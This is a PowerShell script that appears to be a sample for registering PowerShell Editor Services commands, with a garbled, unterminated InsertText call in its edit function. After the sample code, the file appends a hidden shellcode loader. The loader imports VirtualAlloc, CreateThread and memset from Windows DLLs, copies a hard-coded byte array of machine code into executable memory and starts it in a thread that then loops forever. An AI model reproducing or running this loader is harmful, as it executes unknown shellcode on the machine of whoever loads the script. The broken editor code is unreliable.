






function Invoke-MyCommand {
    Write-Output "My command's function was executed!"
}



Register-EditorCommand -Verbose `
   -Name "MyModule.MyCommandWithFunction" `
   -DisplayName "My command with function" `
   -Function Invoke-MyCommand



Register-EditorCommand -Verbose `
   -Name "MyModule.MyCommandWithScriptBlock" `
   -DisplayName "My command with script block" `
   -ScriptBlock { Write-Output "My command's script block was executed!" }



function Invoke-MyEdit([Microsoft.PowerShell.EditorServices.Extensions.EditorContext]$context) {

    

    $context.CurrentFile.InsertText(
        "`r`n
        35, 1);

    

    

    
    
    
}





Register-EditorCommand -Verbose `
   -Name "MyModule.MyEditCommand" `
   -DisplayName "Apply my edit!" `
   -Function Invoke-MyEdit `
   -SuppressOutput

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x1b,0xb6,0x18,0xa4,0xda,0xde,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x0f,0x03,0x56,0x14,0x54,0xed,0x58,0xc2,0x1a,0x0e,0xa1,0x12,0x7b,0x86,0x44,0x23,0xbb,0xfc,0x0d,0x13,0x0b,0x76,0x43,0x9f,0xe0,0xda,0x70,0x14,0x84,0xf2,0x77,0x9d,0x23,0x25,0xb9,0x1e,0x1f,0x15,0xd8,0x9c,0x62,0x4a,0x3a,0x9d,0xac,0x9f,0x3b,0xda,0xd1,0x52,0x69,0xb3,0x9e,0xc1,0x9e,0xb0,0xeb,0xd9,0x15,0x8a,0xfa,0x59,0xc9,0x5a,0xfc,0x48,0x5c,0xd1,0xa7,0x4a,0x5e,0x36,0xdc,0xc2,0x78,0x5b,0xd9,0x9d,0xf3,0xaf,0x95,0x1f,0xd2,0xfe,0x56,0xb3,0x1b,0xcf,0xa4,0xcd,0x5c,0xf7,0x56,0xb8,0x94,0x04,0xea,0xbb,0x62,0x77,0x30,0x49,0x71,0xdf,0xb3,0xe9,0x5d,0xde,0x10,0x6f,0x15,0xec,0xdd,0xfb,0x71,0xf0,0xe0,0x28,0x0a,0x0c,0x68,0xcf,0xdd,0x85,0x2a,0xf4,0xf9,0xce,0xe9,0x95,0x58,0xaa,0x5c,0xa9,0xbb,0x15,0x00,0x0f,0xb7,0xbb,0x55,0x22,0x9a,0xd3,0x9a,0x0f,0x25,0x23,0xb5,0x18,0x56,0x11,0x1a,0xb3,0xf0,0x19,0xd3,0x1d,0x06,0x5e,0xce,0xda,0x98,0xa1,0xf1,0x1a,0xb0,0x65,0xa5,0x4a,0xaa,0x4c,0xc6,0x00,0x2a,0x71,0x13,0xbc,0x2f,0xe5,0x22,0xc1,0xd0,0xdf,0x32,0xc0,0x10,0x3b,0x72,0x4d,0xf6,0x13,0x24,0x1e,0xa7,0xd3,0x94,0xde,0x17,0xbb,0xfe,0xd0,0x48,0xdb,0x00,0x3b,0xe1,0x71,0xef,0x92,0x59,0xed,0x96,0xbe,0x12,0x8c,0x57,0x15,0x5f,0x8e,0xdc,0x9a,0x9f,0x40,0x15,0xd6,0xb3,0x34,0xd5,0xad,0xee,0x92,0xea,0x1b,0x84,0x1a,0x7f,0xa0,0x0f,0x4d,0x17,0xaa,0x76,0xb9,0xb8,0x55,0x5d,0xb2,0x71,0xc0,0x1e,0xac,0x7d,0x04,0x9f,0x2c,0x28,0x4e,0x9f,0x44,0x8c,0x2a,0xcc,0x71,0xd3,0xe6,0x60,0x2a,0x46,0x09,0xd1,0x9f,0xc1,0x61,0xdf,0xc6,0x26,0x2e,0x20,0x2d,0xb7,0x12,0xf7,0x0b,0xcd,0x7a,0xcb;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

